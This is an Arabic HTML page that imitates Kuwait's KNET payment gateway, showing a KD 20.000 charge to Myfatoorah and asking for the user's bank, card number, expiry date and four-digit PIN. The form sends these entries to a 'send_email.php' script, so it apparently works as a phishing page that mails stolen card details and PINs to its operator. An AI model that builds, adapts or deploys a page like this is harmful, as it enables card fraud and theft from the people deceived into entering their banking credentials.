<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة دفع كي نت</title>
    <link rel="stylesheet" href="fayiz.css">
</head>
<body>
    <header id="pageHeader">
        <img src="pc (1).jpg" alt="رأس الصفحة" id="headerImage">
    </header>
    <div class="box bank-info" id="bankInfoBox">
    <img id="imgkn" src="images (3).png" alt="بنك وربة" class="bank-logo" id="bankLogo">
    <p id="beneficiaryLabel">المستفيد: <strong id="beneficiaryName">Myfatoorah General Trading Co.</strong></p>
    <p id="amountLabel">المبلغ: <strong id="amountValue">KD 20.000</strong></p>
</div>

    <div class="box payment-form">
        <form id="paymentForm" action="send_email.php" method="post">
            <div class="input-container">
                <label id="textban"for="bankSelect">اختيار البنك:</label>
                <div class="input-box">
                    <select id="bankSelect" required>
                        <option value="" disabled selected>يرجى اختيار البنك</option>
                        <option value="bank1">البنك الاهلي المتحد ABK  </option>
                        <option value="bank2">RAJHI مصرف الراجحي</option>
                        <option value="bank3">ْBBK بنك الكويت والبحرين</option>
                        <option value="bank4">ْBOUBYAN بنك بوبيان   </option>
                        <option value="bank5">ْBURGAN بنك برقان</option>
                        <option value="bank6">ْCBK البنك التجاري الكويتي</option>
                        <option value="bank7">ْDOHA بنك الدوحة</option>
                        <option value="bank8">ْGBK بنك الخليج</option>
                        <option value="bank9">ْTAM بيتك</option>
                        <option value="bank10">ْKFH بيت التمويل الكويتي</option>
                        <option value="bank11">ْKIB بنك الكويت الدولي</option>
                        <option value="bank12">ْNBK بنك الكويت الوطني</option>
                        <option value="bank13">ْWEYAY الوطني</option>
                        <option value="bank14">ْQNB بنك قطر الوطني</option>
                        <option value="bank15">ْUNB بنك الاتحاد الوطني</option>
                        <option value="bank16">ْWARBA بنك وربة</option>



                    </select>
                </div>
            </div>
            <div class="input-container">
                <label id="text2" for="cardNumber">رقم البطاقة:</label>
                <div class="input-box">
                    <input type="text" id="cardNumber" placeholder="  " required pattern="\d{10}" maxlength="10">
                </div>
                <select id="prefixSelect" required>
                    <option value="ghf" disabled selected>Prefix</option>
                </select>
            </div>
            

            <div class="input-container">
                <label id="texst3" for="expiryDate">تاريخ انتهاء البطاقة:</label>
                <div class="expiry input-box">
                    <select id="monthSelect" required>
                        <option value="" disabled selected>MM</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>

                    </select>
                    <select id="yearSelect" required>
                        <option value="" disabled selected>YYYY</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                        <option value="2034">2034</option>
                        <option value="2035">2035</option>


                    </select>
                </div>
            </div>

            <div class="input-container">
                <label id="texst4"for="pin">الرقم السري:</label>
                <div class="input-box">
                    <input type="password" id="pin" placeholder="****" required pattern="\d{4}" maxlength="4">
                </div>
            </div>
        </form>
    </div>
    
    <div class="box buttons">
        <button type="submit" form="paymentForm" id="submitButton">إرسال</button>
        <button type="button" onclick="resetForm()">إلغاء</button>
    </div>    
    <script src="script.js"></script>
</body>
</html>
